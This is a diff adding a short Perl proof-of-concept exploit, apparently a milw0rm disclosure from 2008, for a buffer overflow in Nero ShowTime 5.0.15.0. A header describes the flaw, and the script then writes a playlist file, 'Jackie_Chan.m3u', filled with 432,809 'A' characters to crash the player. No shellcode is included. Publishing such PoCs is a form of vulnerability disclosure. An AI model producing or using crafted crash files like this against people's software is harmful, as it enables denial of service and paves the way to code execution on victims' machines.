@@ -1,0 +1,42 @@
+#!/usr/bin/perl -w
+#
+# Nero ShowTime v5.0.15.0 m3u Playlist File Remote Buffer Overflow PoC
+#
+# Summary: Nero ShowTime provides you with a high-performance software DVD player
+# that takes you to a new dimension in DVD's. Its cinema-like sound and excellent image
+# quality for all digital pictures make an adventure of every film! What is more, Nero ShowTime
+# supports all DVD-Video formats and can play them from a disc and from the hard drive.
+#
+# Product web page: http://www.nero.com
+#
+# Description: Nero ShowTime is prone to a buffer-overflow vulnerability because it fails
+# to perform adequate boundary checks on user-supplied input. Successfully exploiting
+# these issues may allow remote attackers to execute arbitrary code in the context of the
+# application. Failed exploit attempts will cause denial-of-service conditions. Nero ShowTime
+# 5.0.15.0 is vulnerable, prior versions may also be affected.
+#
+# Tested on Microsoft Windows XP Professional SP2 (English)
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#
+# liquidworm [ t00t ] gmail [ d0t ] com
+#
+# 24.11.2008
+#
+
+$filename = "Jackie_Chan.m3u";
+
+$mana = "A" x 432809;
+
+print "\n\n[*] Creating evul playlist: $filename ...\r\n";
+sleep(3);
+
+open(m3u, ">./$filename") || die "\n\aCannot open $filename: $!";
+
+print m3u "$mana";
+
+close (m3u);
+
+print "\n[*] Playlist file successfully created!\r\n";
+
+# milw0rm.com [2008-11-24]
